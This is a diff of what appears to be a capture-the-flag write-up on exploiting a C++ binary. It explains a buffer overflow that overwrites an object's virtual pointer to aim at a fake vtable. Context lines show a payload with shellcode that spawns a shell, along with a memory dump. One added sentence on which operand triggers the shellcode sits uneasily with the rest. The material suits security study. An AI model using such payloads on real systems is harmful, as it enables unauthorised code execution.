@@ -1,5 +1,5 @@
 
-Reconstructed C++ source from assembly (approx) :
+Reconstructed C++ source from assembly :
 
 ```cpp
 #include <string.h>
@@ -34,7 +34,7 @@ int main(int argc, char **argv) {
     Foo *instance1 = new Foo(5);
     Foo *instance2 = new Foo(6);
 
-    const int v = *instance1 + *instance2;
+    return *instance1 + *instance2;
 }
 ```
 
@@ -59,6 +59,7 @@ Memory layout of the two class :
 ```
 
 Since the class contains **virtual functions**, the compiler has added a **virtual pointer** that points to a **virtual table**, that contains the address of the two method that are virtual : the *plus* and *minus* sign that are overloaded.
+There is two virtual function, so they will be two entry in the virtual table, but the program is only calling the `operator+` overload, and this is the first entry in the virtual table.
 
 The `setAnnotation` method is unsafe and can overflow if the size of the string exceed the buffer allocated in the class. By overflowing the `buffer`, we can actually overwrite the **virtual pointer** of the second instance. We can make it point to a *fake* **vtable** that has an entry that points to a *shellcode*.
 
@@ -87,4 +88,4 @@ $(python -c 'print("\x10\xA0\x04\x08" + "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2
 0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
 ```
 
-The vpointer of `instance2` now points to `0x0804a00c`.
+The vpointer of `instance2` now points to `0x0804a00c`. The first entry of this fake vtable is a pointer that points to the shellcode. Whenever `operator+` will be called with `instance1` as a left-hand side, the *shellcode* will be executed.
